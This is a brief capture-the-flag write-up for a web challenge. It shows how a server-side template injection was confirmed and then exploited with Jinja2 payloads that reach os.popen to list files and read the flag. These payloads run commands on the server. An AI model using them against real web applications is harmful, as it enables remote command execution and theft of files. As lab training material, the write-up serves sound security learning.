# SSTI1

## Description
`I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!`


## Solution
Testing {{7*'7'}} returns 7777777, indicating a Server-Side Template Injection (SSTI) vulnerability.

Using `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}` lists the files and we see a flag file.

Using `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}` reads the flag file and we get the flag.
